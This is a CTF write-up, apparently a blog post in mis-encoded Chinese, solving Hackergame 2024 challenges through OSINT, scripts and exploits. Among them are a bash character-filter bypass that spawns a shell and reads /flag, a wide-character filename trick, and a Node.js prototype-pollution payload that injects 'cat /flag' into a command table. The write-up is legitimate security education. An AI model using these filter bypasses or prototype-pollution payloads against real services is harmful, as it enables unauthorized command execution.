æœ¬é¢˜è§£ä¹Ÿå°†åŒæ­¥äºæˆ‘çš„[ä¸ªäººåšå®¢](https://blog.fyz666.xyz/blog/12095/)

## ç­¾åˆ°

```raw
Hackergameï½ğŸš©ğŸ¶å“¦Hackergameï½ğŸš©ğŸ¶å“¦HackergameğŸš©ğŸ¶
æœ‰äº†ä½ ğŸ˜™â¤ï¸ğŸš©ï¼Œç”Ÿæ´»ç¾å¥½ğŸ˜ğŸ™ğŸ’ï¼Œæ²¡çƒ¦æ¼ğŸ¤·ğŸ¤¤ğŸ¼
Hackergameä¼ å¥‡ğŸŒŠğŸš©ğŸ§œâ€â™‚ï¸ï¼Œå¥‡å¦™è‡³æâœ¨ğŸ§â€â™‚ï¸
æœ€æ£’æ¯”èµ›ğŸ¤©ğŸ‘¾ğŸ®ï¼Œäººäººèµå¹ä½ ğŸ‘ğŸ‘ğŸ‘
å¦‚æœå¡å…³ğŸ˜–ğŸ˜­ï¼Œé‚£å¯ä¸å¯¹ğŸ™…â­•ï¸ğŸ˜
ä»Šæ™šæ²¡æ‹¿flagğŸš©ğŸ˜¨â“ï¼Œæˆ‘å°±ä¼šå¼å«ğŸ˜±ğŸ˜±ğŸ™‰
æ— è®ºç™½å¤©â˜€ï¸ğŸ¤¤ğŸš©ï¼Œè¿˜æ˜¯é»‘å¤œğŸŒ™ğŸ˜ªğŸ’¤
Hackergameçš„æŒ‘æˆ˜è®©å¤´è„‘æ¸…é†’ğŸ¤¯ğŸ¤¯
```

ç›´æ¥æäº¤ï¼ŒæŠŠå‚æ•°`?pass=false`æ”¹æˆ`?pass=true`é‡æ–°è®¿é—®å³å¯ã€‚

~~è¿™æ­ŒçœŸæ´—è„‘ï¼Œæ¯å¤©å¬å‡ é~~

## å–œæ¬¢åšç­¾åˆ°çš„ CTFer ä½ ä»¬å¥½å‘€

ä¼—æ‰€å‘¨çŸ¥ï¼Œä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦æ ¡å†…CTFæˆ˜é˜Ÿæ˜¯Nebulaï¼Œæ‹›æ–°ä¸»é¡µä½äºhttps://www.nebuu.la/

æ‰“å¼€å‘ç°æ˜¯ä¸ªç½‘é¡µæ¨¡æ‹Ÿçš„ç»ˆç«¯ï¼Œæ‰¾äº†åŠå¤©å‘ç°`ls -a`å¯ä»¥æ‰¾åˆ°ç¬¬äºŒä¸ªflagï¼Œ`env`å¯ä»¥æ‰¾åˆ°ç¬¬ä¸€ä¸ªflagã€‚(ç¬¬ä¸€ä¸ªflagæ‰¾äº†åŠå¤©ï¼Œå› ä¸ºä¸€å¼€å§‹å®Œå…¨æ²¡æƒ³åˆ°å»çœ‹ç¯å¢ƒå˜é‡)

## çŒ«å’ªé—®ç­”ï¼ˆHackergame åå‘¨å¹´çºªå¿µç‰ˆï¼‰

1. è¿™é¢˜æ‰¾äº†åŠå¤©ï¼Œå› ä¸ºé‚£ä¸€å¹´çš„Hackergameå¥½åƒæ²¡å†™æ–°é—»ç¨¿ï¼Œç”šè‡³ä¼¼ä¹è¿˜ä¸å«Hackergameï¼Œå«ä»€ä¹ˆã€Œä¿¡æ¯å®‰å…¨å¤§èµ›ã€ï¼Œæœ€ååœ¨[è¿™ä¸ªé¡µé¢](https://lug.ustc.edu.cn/wiki/sec/contest.html)ç¿»åˆ°äº†ç»“æœï¼Œç­”æ¡ˆä¸º3A204

2. ç¿»å®˜æ–¹GitHubå­˜æ¡£å‘ç°æ˜¯2019å¹´ï¼ˆæ³¨æ„åªéœ€è¦çœ‹2019-2023å¹´è¿™5å¹´çš„é¢˜ï¼‰ï¼Œç„¶åæœåˆ°[ç½‘é¡µ](https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/)ï¼Œç­”æ¡ˆä¸º2682

3. æœå›¾ä¹¦é¦†å®˜ç½‘æ²¡æœ‰æœåˆ°ç›¸å…³ä¿¡æ¯ï¼ˆå›¾ä¹¦é¦†æ€ä¹ˆå¯èƒ½å»è®°å½•è¿™ç§ä¸œè¥¿ï¼‰ï¼Œç„¶åæƒ³åˆ°å»GitHubä¸Šçš„2018å¹´é¢˜è§£å­˜æ¡£çš„[èŠ±çµ®é¡µ](https://github.com/ustclug/hackergame2018-writeups/blob/master/misc/others.md)çœ‹çœ‹ï¼Œå‘ç°äº†ç­”æ¡ˆï¼šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»

4. æœåˆ°[ç›¸å…³è®ºæ–‡](https://www.usenix.org/conference/usenixsecurity24/presentation/ma-jinrui)ï¼Œ~~æŠŠé‡Œé¢å‡ºç°åˆ°çš„æ•°å­—éƒ½è¯•äº†ä¸€é~~ï¼Œç„¶åæ‰¾åˆ°ç­”æ¡ˆï¼š336

5. å‰æ®µæ—¶é—´æ­£å¥½å…³æ³¨äº†è¿™ä¸ªäº‹ä»¶ï¼Œå½“æ—¶å°±æ‰¾åˆ°äº†[ç›¸å…³çš„commit](https://github.com/torvalds/linux/commit/6e90b675cf942e50c70e8394dfb5862975c3b3b2)ï¼Œäºæ˜¯è¿™é¢˜ä¸åºŸå‚¬é£æ»‹åŠ›

6. æ‰¾åˆ°äº†è¿™ä¸ªæ¨¡å‹çš„hgé¡µé¢ï¼Œç»“æœï¼š<img src="images/ddee409c-fbd4-4312-881a-fc5c55988feb.png" alt="image-20241109134621799" style="zoom:50%;" />

   èšŒï¼åæ¥æ‰¾äº†ä¸€ä¸ª[åœ¨çº¿è¿è¡Œåˆ†è¯å™¨çš„ç½‘é¡µ](https://huggingface.co/spaces/Xenova/the-tokenizer-playground)ã€‚å¤åˆ¶è¿›å»å¾—åˆ°1834ï¼Œæäº¤å‘ç°ä¸å¯¹ï¼Œé‚å»ç©·ä¸¾ï¼Œå¾—åˆ°ç­”æ¡ˆ1833ã€‚åŸæ¥æ˜¯ä¹‹å‰å¤åˆ¶è¿›å»æœ€å¼€å§‹å¤šäº†æ¢è¡Œã€‚

## æ‰“ä¸å¼€çš„ç›’

æ‰¾åˆ°ä¸€ä¸ªåœ¨çº¿æŸ¥çœ‹è¿™ç§æ–‡ä»¶çš„[ç½‘é¡µ](https://www.viewstl.com/classic/)ã€‚

ç„¶åé€ä¸ªå°è¯•å³è¾¹çš„é€‰é¡¹ï¼Œæœ€åå‘ç°æŠŠ`Display`ä¸‹é¢çš„`Wireframe`é€‰ä¸Šï¼Œå³å¯å‘ç°flagï¼š

<img src="images/3d6070a6-2676-43fc-8549-cc91cb9e4b36.png" alt="image-20241109135258547" style="zoom:50%;" />

æ”¾å¤§ä»¥åå¯ä»¥ç›´æ¥è‚‰çœ¼çœ‹å‡ºã€‚

å¦ï¼šå¦‚æœå¥–å“èƒ½é™„å¸¦å‘ä¸ªè¿™ä¸ªç›’å­çš„é€æ˜ç‰ˆï¼Œé‚£ä¸€å®šæ˜¯æå¥½çš„ã€‚

## æ¯æ—¥è®ºæ–‡å¤ªå¤šäº†ï¼

ç»™äº†ä¸€ä¸ª[ACMè®ºæ–‡çš„é“¾æ¥](https://dl.acm.org/doi/10.1145/3650212.3652145)ï¼Œç„¶åæ²¡æœ‰å…¶ä»–ä»»ä½•é™„ä»¶äº†ï¼Ÿ

æˆ‘ç™¾æ€ä¸è§£ï¼Œæ€»ä¸å¯èƒ½åœ¨ACMå®˜ç½‘ä¸Šåšæ–‡ç« å§ã€‚äºæ˜¯æˆ‘æ‰“å¼€è®ºæ–‡ï¼Œå»äº†è§£äº†ä¸€ä¸‹è¿™ä¸ªè®ºæ–‡çš„ç®—æ³•ï¼Œæ‰¾åˆ°äº†ä»–ç»™çš„æºç GitHubé“¾æ¥ã€‚æˆ‘ç”šè‡³æŠŠè¿™ä¸ªé¡¹ç›®è·‘äº†èµ·æ¥ï¼Œä½†å§‹ç»ˆæƒ³ä¸é€šè¿™å’Œæ‹¿flagæœ‰ä»€ä¹ˆå…³ç³»ã€‚

---

åæ¥è¿™ä¸ªé¢˜è§£å‡ºçš„äººè¶Šæ¥è¶Šå¤šï¼Œæˆ‘æ„è¯†åˆ°è‡ªå·±çš„æ–¹å‘å‡ºäº†é—®é¢˜ã€‚æˆ‘æ‰“å¼€è®ºæ–‡ç›´æ¥æœç´¢flagï¼Œå±…ç„¶æœåˆ°äº†ä¸€å¤„é«˜äº®ï¼š

<img src="images/9b83fc7a-3041-40ed-a93d-c665cbd8c378.png" alt="image-20241109135919432" style="zoom:50%;" />

ç„¶è€Œçœ‹ä¸Šå»åˆä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œå¤åˆ¶ä¸€ä¸‹è¿™é‡Œçš„å†…å®¹ï¼Œå‘ç°æ˜¯â€œflag hereâ€ï¼Œéš¾é“flagè—åœ¨å›¾é‡Œï¼Ÿ

äºæ˜¯æˆ‘æŠŠè¿™ç¯‡è®ºæ–‡çš„pdfçš„å›¾ç‰‡å…¨éƒ¨å¯¼å‡ºï¼Œç„¶åå‘ç°ï¼š

<img src="images/681c0ca5-fdac-4654-911c-031ef293624a.png" alt="image-20241109140111767" style="zoom:50%;" />

è‰ï¼Œè¿™æ˜¯ä»€ä¹ˆè¡Œä¸ºè‰ºæœ¯ï¼Ÿ

## æ¯”å¤§å°ç‹

è¿™é¢˜ä¼°è®¡çµæ„Ÿæ¥æºäºå‰æ®µæ—¶é—´å¾ˆç«çš„[å¤§å­¦ç”Ÿå…¥ä¾µå°çŒ¿æœé¢˜äº‹ä»¶](https://app.xinhuanet.com/news/article.html?articleId=d8b06038c4cf4dd3e32c5fc653f3419c)

å’¦ï¼Œè¿™ä¸æ˜¯å†™è„šæœ¬å°±è¡Œäº†ï¼Ÿä¸€å¼€å§‹æˆ‘å†™äº†ä¸ªJSè„šæœ¬ï¼Œè¯•å›¾åœ¨æµè§ˆå™¨é‡Œç›´æ¥ç»™ä»–è¿‡äº†ï¼Œç»“æœå‘ç°é¢˜ç›®çš„åˆ·æ–°ä¼¼ä¹å­˜åœ¨å»¶è¿Ÿï¼Œæˆ‘æ— è®ºå¦‚ä½•éƒ½æ²¡æ³•åœ¨10ç§’å†…è·‘å®Œå…¨éƒ¨é¢˜ç›®ã€‚é‚åˆ†æäº†ä¸€ä¸‹æ¥å£ï¼Œç„¶åå†™äº†ä¸ªPythonè„šæœ¬ï¼š

```python
import json
import time
import requests

sess = requests.session()

headers = {
    'content-type': 'application/json',
    'cookie': 'Your cookie here'
}
game = sess.post('http://202.38.93.141:12122/game', data=json.dumps({}), headers=headers).json()['values']

data = {'inputs': []}
for a, b in game:
    if a < b:
        data['inputs'].append('<')
    else:
        data['inputs'].append('>')

time.sleep(5)
headers['cookie'] = f'session={sess.cookies["session"]}'
r = sess.post('http://202.38.93.141:12122/submit', data=json.dumps(data), headers=headers)
print(r.json())

```

ç¨å¾®å¤„ç†äº†ä¸€ä¸‹`Cookie`å°±è¿‡äº†ã€‚

## æ—…è¡Œç…§ç‰‡ 4.0

### LEO_CHAN?

**é—®é¢˜ 1: ç…§ç‰‡æ‹æ‘„çš„ä½ç½®è·ç¦»ä¸­ç§‘å¤§çš„å“ªä¸ªæ ¡é—¨æ›´è¿‘ï¼Ÿï¼ˆæ ¼å¼ï¼š**`Xæ ¡åŒºYé—¨`**ï¼Œå‡ä¸ºä¸€ä¸ªæ±‰å­—ï¼‰**

ç§‘å¤§å­¦ç”Ÿç›´æ¥ç§’ç­”ã€‚ä¸œæ ¡åŒºè¥¿é—¨

**é—®é¢˜ 2: è¯è¯´ Leo é…±ä¸Šæ¬¡å‡ºç°åœ¨æ¡æ¶ä¸Šæ˜¯â€¦â€¦ç§‘å¤§ä»Šå¹´çš„ ACG éŸ³ä¹ä¼šï¼Ÿæ´»åŠ¨æ—¥æœŸæˆ‘æ²¡è®°é”™çš„è¯æ˜¯ï¼Ÿï¼ˆæ ¼å¼ï¼š**`YYYYMMDD`**ï¼‰**

æœåˆ°[ç½‘é¡µ](https://www.bilibili.com/opus/930934582351495204)ï¼Œå¾—åˆ°ç­”æ¡ˆä¸º20240519ã€‚

### FULL_RECALL

**é—®é¢˜ 3: è¿™ä¸ªå…¬å›­çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆä¸éœ€è¦å¡«å†™å…¬å›­æ‰€åœ¨å¸‚åŒºç­‰ä¿¡æ¯ï¼‰**

è¿™é¢˜ç›´æ¥æœå›¾ä¼¼ä¹æ˜¯çœŸæœä¸åˆ°ä»€ä¹ˆä¸œè¥¿ï¼Œä¸è¿‡æˆ‘ä¸€ä¸‹å°±æ³¨æ„åˆ°äº†åƒåœ¾æ¡¶ä¸Šçš„â€œå…­å®‰å›­æ—â€å››ä¸ªå­—ï¼Œä¸€å¼€å§‹ä»¥ä¸ºè¿™å°±æ˜¯å…¬å›­åï¼ˆå¿˜äº†placeholderä¸Šçš„å†…å®¹ï¼‰ã€‚

ç„¶åæˆ‘æ³¨æ„åˆ°è·¯ä¸Šæœ‰ä¸€æ¡å½©è™¹çº¿æ¡ï¼Œé‚æœç´¢ï¼šå…­å®‰ å½©è™¹è·‘é“ã€‚æœåˆ°[ç½‘é¡µ](https://www.sohu.com/a/498872898_100023473)ï¼Œå¯¹æ¯”äº†ä¸€ä¸‹ä¸‰ç§é¢œè‰²çš„æ’åˆ—ï¼Œå‘ç°åº”è¯¥æ˜¯å¯¹çš„ï¼Œå¾—åˆ°ç­”æ¡ˆä¸ºï¼šä¸­å¤®å…¬å›­ã€‚

é—®é¢˜ 4: è¿™ä¸ªæ™¯è§‚æ‰€åœ¨çš„æ™¯ç‚¹çš„åå­—æ˜¯ï¼Ÿï¼ˆä¸‰ä¸ªæ±‰å­—ï¼‰

ç›´æ¥æœå›¾å³å¯ï¼Œæœåˆ°ä¸‰å³¡æˆªæµçŸ³ï¼Œå†é¡ºç€è¿™ä¸ªçº¿ç´¢ä¸€é€šæœç´¢ä¸‰ä¸ªå­—çš„æ™¯åŒºï¼Œæœåˆ°ï¼šå›å­å²­ã€‚

### OMINOUS_BELL

**é—®é¢˜ 5: è·ç¦»æ‹æ‘„åœ°æœ€è¿‘çš„åŒ»é™¢æ˜¯ï¼Ÿï¼ˆæ— éœ€åŒ…å«é™¢åŒºã€åœ°åä¿¡æ¯ï¼Œæ ¼å¼ï¼šXXXåŒ»é™¢ï¼‰**

æ²¡çœ‹é¢˜ç›®æç¤ºï¼Œç›´æ¥æ³¨æ„åˆ°å·¦ä¸‹è§’çš„é‚£ä¸ªè½¦çš„è½¦èº«å¸¦ç²‰è‰²åˆ·æ¼†ï¼Œæœç´¢â€œåŠ¨è½¦ ç²‰è‰²â€ï¼Œç›´æ¥æœåˆ°[ç½‘é¡µ](https://www.sohu.com/a/823020940_121117452)ï¼Œäºæ˜¯å…ˆå‡ºä¸‹ä¸€é—®ç­”æ¡ˆï¼šCRH6F-A

ç„¶åæœäº†ä¸€ä¸‹è¿™ç­åˆ—è½¦çš„ç»åœç«™ï¼š

<img src="images/8c18546e-bb3c-44a5-8e33-2d6edd77558c.png" alt="image-20241109142626373" style="zoom:50%;" />

å¥½åƒä¹Ÿä¸å¤šï¼Ÿæ‰‹åŠ¨ä¸€ä¸ªä¸€ä¸ªè¯•è¿‡æ¥ï¼Œå‘ç°æ¸…æ²³ç«™é™„è¿‘çš„ä¸€ä¸ªåŒ»é™¢ï¼šç§¯æ°´æ½­åŒ»é™¢ï¼Œç¬¦åˆè¦æ±‚ã€‚

**é—®é¢˜ 6: å·¦ä¸‹è§’çš„****åŠ¨è½¦ç»„å‹å·****æ˜¯ï¼Ÿ**

å¦‚ä¸Šï¼šCRH6F-A

---

## ä¸å®½çš„å®½å­—ç¬¦

é¢˜ç›®æºç å¦‚ä¸‹ï¼š

```cpp
#include <iostream>
#include <fstream>
#include <cctype>
#include <string>
#include <windows.h>

int main()
{
    std::wcout << L"Enter filename. I'll append 'you_cant_get_the_flag' to it:" << std::endl;

    // Get the console input and output handles
    HANDLE hConsoleInput = GetStdHandle(STD_INPUT_HANDLE);
    HANDLE hConsoleOutput = GetStdHandle(STD_OUTPUT_HANDLE);

    if (hConsoleInput == INVALID_HANDLE_VALUE || hConsoleOutput == INVALID_HANDLE_VALUE)
    {
        // Handle error â€“ we can't get input/output handles.
        return 1;
    }

    DWORD mode;
    GetConsoleMode(hConsoleInput, &mode);
    SetConsoleMode(hConsoleInput, mode | ENABLE_PROCESSED_INPUT);

    // Buffer to store the wide character input
    char inputBuffer[256] = { 0 };
    DWORD charsRead = 0;

    // Read the console input (wide characters)
    if (!ReadFile(hConsoleInput, inputBuffer, sizeof(inputBuffer), &charsRead, nullptr))
    {
        // Handle read error
        return 2;
    }

    // Remove the newline character at the end of the input
    if (charsRead > 0 && inputBuffer[charsRead - 1] == L'\n')
    {
        inputBuffer[charsRead - 1] = L'\0'; // Null-terminate the string
        charsRead--;
    }

    // Convert to WIDE chars
    wchar_t buf[256] = { 0 };
    MultiByteToWideChar(CP_UTF8, 0, inputBuffer, -1, buf, sizeof(buf) / sizeof(wchar_t));

    std::wstring filename = buf;

    // Haha!
    filename += L"you_cant_get_the_flag";

    std::wifstream file;
    file.open((char*)filename.c_str());

    if (file.is_open() == false)
    {
        std::wcout << L"Failed to open the file!" << std::endl;
        return 3;
    }

    std::wstring flag;
    std::getline(file, flag);

    std::wcout << L"The flag is: " << flag << L". Congratulations!" << std::endl;

    return 0;
}
```

ä¸æ˜¯å¾ˆçœ‹å¾—æ‡‚ä¸€äº›å‡½æ•°æ˜¯åœ¨å¹²ä»€ä¹ˆï¼Œä½†é€šè¿‡æ‹·é—®GPTï¼Œä»¥åŠæŸ¥æ‰¾å„ç§æ–‡æ¡£ï¼Œå‘ç°å…¶å®æ‰€è°“çš„â€œå®½å­—ç¬¦â€å°±æ˜¯æŠŠç›¸é‚»ä¸¤ä¸ªæ™®é€šå­—ç¬¦çš„asciiç åˆ†ä¸ºä½ä½å’Œé«˜ä½æ‹¼åœ¨ä¸€èµ·ï¼Œä½œä¸ºä¸€æ•´ä¸ªå­—ç¬¦å¤„ç†ã€‚è€Œåè¿‡æ¥æŠŠå®½å­—ç¬¦è½¬ä¸ºæ™®é€šå­—ç¬¦çš„æ—¶å€™åˆ™æ˜¯åšç›¸åæ“ä½œï¼Œå¹¶ä¸”Cè¯­è¨€çš„`char*`æ˜¯æ£€æµ‹åˆ°`\x0`å°±ç›´æ¥æˆªæ–­äº†ã€‚

é‚£ä¹ˆå°Aåœ¨åé¢æ‹¼çš„è¿™ä¸€ä¸²`you_cant_get_the_flag`èµ·åˆ°äº†ä»€ä¹ˆä½œç”¨å‘¢ï¼Ÿæˆ‘åæ­£æ²¡çœ‹å‡ºæ¥ã€‚

äºæ˜¯å†™å‡ºè„šæœ¬ï¼š

```python
from pwn import remote

ascii_bytes = [
    0x5A,  # 'Z'
    0x3A,  # ':'
    0x2f,  # '/'
    0x2f,  # '/'
    0x74,  # 't'
    0x68,  # 'h'
    0x65,  # 'e'
    0x66,  # 'f'
    0x6C,  # 'l'
    0x61,  # 'a'
    0x67   # 'g'
]

wchar_values = []
for i in range(0, len(ascii_bytes), 2):
    low_byte = ascii_bytes[i]
    high_byte = ascii_bytes[i+1] if i+1 < len(ascii_bytes) else 0x00
    wchar = (high_byte << 8) + low_byte
    wchar_values.append(wchar)

payload = ''.join(chr(wchar) for wchar in wchar_values).encode()
r = remote('202.38.93.141', 14202)
r.sendlineafter(b'token: \n', b'TOKEN')
r.sendlineafter(b"I'll append 'you_cant_get_the_flag' to it:\r\n", payload)
print(r.recv())

```

ä¸€å¼€å§‹è¯•äº†`Z:\theflag`ï¼Œç„¶è€Œæ²¡è¿‡ï¼Œç„¶åæŠŠåæ–œæ æ¢æˆäº†ä¸¤ä¸ªæ­£æ–œæ å°±è¿‡äº†ã€‚

æ‰€ä»¥è¿™é¢˜å°Aåˆ°åº•è¯•äº†ä»€ä¹ˆæ–‡ä»¶åå¯ä»¥ã€Œæµ‹è¯•è¿‡æ— è¯¯ã€çš„ï¼Ÿ

---

## PowerfulShell

å¾ˆæœ‰æ„æ€çš„é¢˜ï¼Œä½†æˆ‘å¹³æ—¶å†™`bash`å†™å°‘äº†ï¼Œå¯¹å®ƒçš„å¾ˆå¤šç‰¹æ€§ä¸å¤ªäº†è§£ï¼Œå› æ­¤å¡åˆ°äº†ç¬¬å››å¤©æ‰è§£å‡ºè¿™é¢˜ã€‚

æºç å¦‚ä¸‹ï¼š

```bash
#!/bin/bash

FORBIDDEN_CHARS="'\";,.%^*?!@#%^&()><\/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0"

PowerfulShell() {
    while true; do
        echo -n 'PowerfulShell@hackergame> '
        if ! read input; then
            echo "EOF detected, exiting..."
            break
        fi
        if [[ $input =~ [$FORBIDDEN_CHARS] ]]; then
            echo "Not Powerful Enough :)"
            exit
        else
            eval $input
        fi
    done
}

PowerfulShell
```

åœ¨çœ‹æºç ä¹‹å‰æˆ‘ä¸€ç›´ä»¥ä¸ºè¿™æ˜¯ä¸ª`Powershell`é¢˜ï¼Œæ¯”èµ·`bash`ï¼Œ`Powershell`æˆ‘å°±æ›´ä¸ä¼šäº†ï¼Œå› æ­¤æˆ‘å‰ä¸¤å¤©æ ¹æœ¬æ²¡çœ‹è¿™é¢˜ã€‚

ç„¶åæˆ‘å‘ç°æ˜¯ä¸ª`bash`ï¼Œé‚£ä¼¼ä¹è¿˜èƒ½åšä¸€ä¸‹ã€‚

å‘ç°è¿™é¢˜å°±æ˜¯æŠŠå¾ˆå¤šå­—ç¬¦éƒ½banäº†ï¼Œéœ€è¦æˆ‘ä»¬ç”¨ä»…å‰©çš„å‡ ä¸ªå­—ç¬¦å»è¿è¡Œèµ·æ¥`cat /flag`ã€‚

æˆ‘ä¸€å¼€å§‹æœâ€œexecute bash without lettersâ€ï¼Œæœåˆ°äº†è¿™ä¸ªç½‘é¡µï¼šhttps://www.reddit.com/r/hacking/comments/1bdjg9z/linux_shell_escape_execute_commands_without/

å‘ç°æ¥¼ä¸»ä¼¼ä¹åœ¨éª—picoCTFçš„æ€è·¯ï¼Œç¬‘æ­»ã€‚

<img src="images/7d2a6405-7aad-4e76-9473-5ac2f8f69fbe.png" alt="image-20241109144024043" style="zoom:50%;" />

æ¥¼ä¸»è¡¨ç¤ºå¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ªå­—ç¬¦ä¸²ä»£æ›¿å‘½ä»¤`ls`

```bash
$'\154'$'\163'
```

ä¸è¿‡æˆ‘ä»¬çš„é¢˜ç›®banäº†å•å¼•å·ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•èµ°ä¸é€šã€‚

ç„¶åæˆ‘æŸ¥äº†ä¸€ä¸‹è¿™ä¸ªpicoCTFçš„é¢˜ï¼Œå‘ç°å’Œæˆ‘ä»¬è¿™ä¸ªé¢˜è¿˜æ˜¯æœ‰ç‚¹åŒºåˆ«ï¼Œé™åˆ¶çš„å­—ç¬¦å°‘äº†è®¸å¤šã€‚

æœ€åæˆ‘å¼€å§‹ç¿»`bash`ç‰¹æ®ŠæŒ‡ä»¤çš„æ–‡æ¡£ï¼ˆè¯è¯´ä¸åº”è¯¥ä¸€å¼€å§‹å°±è¿™ä¹ˆåšå—ï¼‰ï¼Œå‘ç°`bash`å¯ä»¥ç”¨ç¾å…ƒç¬¦å·ã€èŠ±æ‹¬å·ã€å†’å·å®ç°å­—ç¬¦ä¸²åˆ‡ç‰‡ï¼Œæ ¼å¼å¤§æ¦‚æ˜¯è¿™æ ·ï¼š

```bash
${s:start:length}
```



è€Œå¾ˆå·§çš„æ˜¯ï¼Œè¿™äº›ç¬¦å·éƒ½æ²¡è¢«banï¼Œç„¶åæˆ‘è¯•äº†ä¸€ä¸‹æ²¡è¢«bançš„å¦ä¸€ä¸ªå¾ˆæœ‰ç”¨çš„ç¬¦å·ï¼š`~`ï¼Œå‘ç°å®ƒçš„è¾“å‡ºæ˜¯ï¼š`/players`

<img src="images/bd23934b-52e8-4d6b-a1c5-dbcab16345e8.png" alt="image-20241109144753976" style="zoom:50%;" />

é‚£å°±æœ‰æ€è·¯äº†ï¼ç”±äºä¸‹åˆ’çº¿å¯ä»¥éšä¾¿ç”¨ï¼Œæˆ‘ä»¬ç›¸å½“äºæ‹¥æœ‰äº†å®šä¹‰å˜é‡çš„èƒ½åŠ›ï¼Œäºæ˜¯å¯ä»¥å…ˆæŠŠ`~`çš„è¾“å‡ºç»“æœå­˜åˆ°åŒä¸‹åˆ’çº¿å˜é‡é‡Œï¼š

```bash
__=~
```

ç„¶å`__`è¿™ä¸ªå˜é‡å°±ç­‰äºäº†`/players`ï¼Œé€šè¿‡å¯¹è¿™ä¸ªå˜é‡çš„åˆ‡ç‰‡ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å‘½ä»¤`ls`ï¼š

```bash
${__:2:1}${__:7:1}
```

æ‰§è¡Œä¸€ä¸‹å‘½ä»¤å‘ç°å½“å‰è·¯å¾„ä¸‹æœ‰ä¸”åªæœ‰ä¸€ä¸ªæ–‡ä»¶ï¼š

<img src="images/7e160bc9-2037-4a9e-9f2c-f779de1c9738.png" alt="image-20241109144825612" style="zoom:50%;" />

æ³¨æ„åˆ°è¿™ä¸ªè¾“å‡ºæœ‰ä¸€ä¸ªè‹±æ–‡å¥å·ï¼Œæˆ‘ä¸€å¼€å§‹è¿˜æƒ³ç€ç”¨`ls`å»çœ‹çœ‹ä¸Šçº§ç›®å½•æœ‰å•¥ï¼Œä½†è½¬å¿µä¸€æƒ³ï¼Œç›´æ¥å–æœ€åä¸¤ä¸ªå­—ç¬¦ï¼Œè¿™ä¸å°±ç›´æ¥æ‹¿åˆ°shelläº†ï¼Œè¿˜è´¹åˆ«çš„å•¥åŠ²ï¼Ÿäºæ˜¯ï¼š

```bash
__=`${__:2:1}${__:7:1}`
${__:14:2}
```

è¿™æ ·å°±ç»•è¿‡äº†å­—ç¬¦é™åˆ¶ï¼Œç›´æ¥`cat /flag`å³å¯ï¼š

<img src="images/0b0baee3-7626-4ed6-85fb-4056bc90e8b7.png" alt="image-20241109145214629" style="zoom:50%;" />

## Node.js is Web Scale

ç»™äº†æœåŠ¡ç«¯æºç ï¼š

```js
// server.js
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const { execSync } = require("child_process");

const app = express();
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

let cmds = {
  getsource: "cat server.js",
  test: "echo 'hello, world!'",
};

let store = {};

// GET /api/store - Retrieve the current KV store
app.get("/api/store", (req, res) => {
  res.json(store);
});

// POST /set - Set a key-value pair in the store
app.post("/set", (req, res) => {
  const { key, value } = req.body;

  const keys = key.split(".");
  let current = store;

  for (let i = 0; i < keys.length - 1; i++) {
    const key = keys[i];
    if (!current[key]) {
      current[key] = {};
    }
    current = current[key];
  }

  // Set the value at the last key
  current[keys[keys.length - 1]] = value;

  res.json({ message: "OK" });
});

// GET /get - Get a key-value pair in the store
app.get("/get", (req, res) => {
  const key = req.query.key;
  const keys = key.split(".");

  let current = store;
  for (let i = 0; i < keys.length; i++) {
    const key = keys[i];
    if (current[key] === undefined) {
      res.json({ message: "Not exists." });
      return;
    }
    current = current[key];
  }

  res.json({ message: current });
});

// GET /execute - Run commands which are constant and obviously safe.
app.get("/execute", (req, res) => {
  const key = req.query.cmd;
  const cmd = cmds[key];
  res.setHeader("content-type", "text/plain");
  res.send(execSync(cmd).toString());
});

app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Start the server
const PORT = 3000;
app.listen(PORT, () => {
  console.log(`KV Service is running on port ${PORT}`);
});
```

å‘ç°`cmds`é‡Œæœ‰ä¸€äº›å‘½ä»¤ï¼Œä½†æ˜¾ç„¶æ²¡æœ‰`cat /flag`ï¼Œè€Œæˆ‘ä»¬åˆåªèƒ½é€šè¿‡`execute`æ¥å£å»æ‰§è¡Œå‘½ä»¤ï¼Œé‚£è¦æ€ä¹ˆåŠå‘¢ï¼Ÿ

æ³¨æ„åˆ°æˆ‘ä»¬å¯ä»¥ç”¨`set`æ¥å£ä¸º`current`è¿™ä¸ªå˜é‡è®¾å®šé”®å€¼å¯¹ï¼Œè€Œ`JavaScript`å½“ä¸­ï¼Œé€šè¿‡ç‚¹è¿ç®—å¯ä»¥è·å–åˆ°çš„attributeï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä¸­æ‹¬å·è¿ç®—è·å–ï¼Œèµ‹å€¼ä¹Ÿæ˜¯åŒç†ï¼Œè¿™æ ·æƒ³æ³•å°±å¾ˆè‡ªç„¶äº†ï¼Œè¿™æ˜¯ä¸€ä¸ªProtoTypeæ±¡æŸ“æ”»å‡»ã€‚

æˆ‘ä»¬ç›´æ¥setï¼š

```json
{
    "key": "__proto__.catflag",
    "value": "cat /flag"
}
```

ç„¶å`execute?cmd=catflag`ï¼Œå³å¯è·å–flagã€‚

## PaoluGPT

### åƒé‡ŒæŒ‘ä¸€

æ‰“å¼€ç½‘é¡µï¼Œå‘ç°æœ‰ä¸€å †èŠå¤©è®°å½•ï¼ˆ999ä¸ªï¼‰ï¼Œ~~ç›´æ¥ä¸€ä¸ªä¸€ä¸ªæ‰‹åŠ¨ç‚¹å¼€~~ å†™ä¸ªçˆ¬è™«å¾ˆå¿«å°±æ‰¾åˆ°äº†ç¬¬ä¸€ä¸ªflagã€‚

### çª¥è§†æœªçŸ¥

